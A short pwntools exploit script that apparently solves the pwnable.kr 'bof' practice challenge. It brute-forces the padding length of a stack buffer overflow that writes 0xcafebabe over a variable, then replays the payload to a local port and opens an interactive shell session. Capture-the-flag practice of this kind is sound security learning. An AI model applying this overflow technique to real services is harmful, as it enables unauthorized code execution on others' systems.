#!/usr/bin/env python

# Copy to pwnable.kr /tmp/ somewhere
# ???
# PROFIT
import pwn
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

# spray and pray
for length in range(32,60):
    p = pwn.process(f'{args.filename}')
    buffer = b'A' * length + pwn.p32(0xcafebabe) + b'\n'
    print(buffer)
    p.send(buffer)
    output = p.recvall(timeout=0.1)
    print(output)
    p.close()
    if not b'Nah..' in output:
        break

# buffer still contains the working solution
conn = pwn.remote('127.0.0.1', 9000)
conn.send(buffer)
conn.interactive()
conn.close()
